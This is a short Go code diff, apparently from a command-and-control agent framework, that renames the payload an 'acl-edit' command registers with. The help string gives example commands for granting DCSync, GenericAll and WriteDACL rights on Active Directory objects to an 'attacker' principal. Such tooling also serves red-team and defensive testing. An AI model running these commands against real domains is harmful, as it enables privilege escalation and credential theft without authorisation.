@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "acl-edit",
 		Description:         "Read and modify Active Directory object DACLs (access control lists). Add/remove ACEs, grant DCSync rights, GenericAll, WriteDACL. Backup and restore DACLs for clean operations.",
 		HelpString:          "acl-edit -action read -server dc01 -target jsmith\nacl-edit -action grant-dcsync -server dc01 -principal attacker -username user@domain -password pass\nacl-edit -action add -server dc01 -target victim -principal attacker -right genericall\nacl-edit -action backup -server dc01 -target jsmith",
